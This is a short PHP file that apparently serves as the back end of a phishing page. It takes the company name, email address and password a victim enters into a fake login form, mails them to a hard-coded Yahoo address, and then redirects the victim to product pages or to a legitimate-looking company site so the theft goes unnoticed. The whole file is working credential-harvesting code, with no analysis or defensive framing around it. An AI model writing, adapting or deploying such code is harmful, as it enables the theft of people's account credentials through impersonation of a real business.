<?php
function sendMail(){
	$company = $_POST['company'];
	$email = $_POST['email'];
	$password = $_POST['password'];
	$myemail = "doncoo@yahoo.com";
	$subject = "TECHNO AUTO CONSTRUCTION COMPANY";
	$message = "Company: ". $company." "."Email: ". $email." "."Password: ". $password;
	mail($myemail, $subject, $message);
}
if (isset($_POST['login1'])) {
	sendMail();
	header('location: viewproduct.php');
}
elseif (isset($_POST['login2'])) {
	sendMail();
	header('location: viewproducts.php');
}
elseif (isset($_POST['login3'])) {
	sendMail();
	header('location: viewproductz.php');
}
elseif (isset($_POST['login4'])) {
	sendMail();
	header('location: http://technogcc.com');
}
?>